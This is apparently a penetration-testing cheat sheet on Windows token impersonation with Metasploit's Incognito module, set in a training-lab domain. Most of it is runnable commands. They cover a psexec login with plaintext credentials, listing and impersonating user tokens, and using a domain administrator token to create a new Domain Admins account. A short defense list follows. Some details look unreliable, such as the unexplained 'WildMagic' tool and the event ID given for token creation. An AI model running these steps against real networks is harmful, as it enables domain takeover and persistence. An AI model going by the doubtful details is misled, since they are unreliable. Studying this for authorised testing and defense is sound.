# TOKEN IMPERSONATION / INCOGNITO

Impersonate user tokens in memory to escalate privileges and move laterally without knowing plaintext passwords. Critical technique when you have system/SYSTEM level access.

## Overview

- **What it is**: Assumes the security context of another user by stealing their access token
- **Requirement**: Must have system/SYSTEM level access on compromised machine
- **Impact**: Escalate privileges, access restricted resources, lateral movement
- **Tools**: Incognito (built into Metasploit), Rubeus, WildMagic

## Using Incognito in Metasploit

### Start Metasploit Session with Elevated Access

```bash
msfconsole
search psexec
use exploit/windows/smb/psexec
set smbdomain MARVEL.local
set smbpass Password1
set smbuser fcastle
set rhosts 10.0.2.16
exploit
```

### Load Incognito Module

```bash
load incognito
```

### List Available Tokens

List all user tokens available on the system:

```bash
list_tokens -u
```

Output shows DOMAIN\USER tokens, including:
- Delegates (can be used for delegation attacks)
- Impersonated (already in use)

### Impersonate User Token

Impersonate a specific user:

```bash
impersonate_token marvel\\fcastle
shell
whoami
```

Verify you're now running as fcastle.

### Escalate to Administrator

```bash
impersonate_token marvel\\administrator
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

Now you can add new admin users, modify permissions, etc. as domain administrator.

## Token Types

- **Delegate**: Can be used for constrained delegation attacks
- **Impersonated**: Currently impersonated token
- **Primary**: Default token for process execution

## Defense

- Enable Windows Defender Credential Guard
- Restrict who can run as SYSTEM
- Enable Token Abuse detection
- Monitor process token creation events (Event ID 4907)
- Require multi-factor authentication for sensitive accounts
- Use Protected Users group for domain admins